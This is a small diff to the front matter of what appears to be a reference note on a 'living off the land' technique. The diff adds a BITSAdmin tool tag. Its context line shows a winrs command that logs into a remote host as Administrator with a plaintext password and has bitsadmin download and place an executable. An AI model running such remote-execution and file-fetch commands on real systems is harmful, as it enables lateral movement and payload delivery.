@@ -9,6 +9,8 @@ output: winrs -r:ms-sql01 -u:.\Administrator -p:PassW0rd1 "bitsadmin /transfer W
   /priority normal http://10.0.0.12/File.exe c:\\Users\\Public\File.exe"
 created_at: '2023-01-12T22:08:55.684582+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[BITSAdmin]]'
 ---
 
 # Copy file to remote machine Bitsadmin LOL
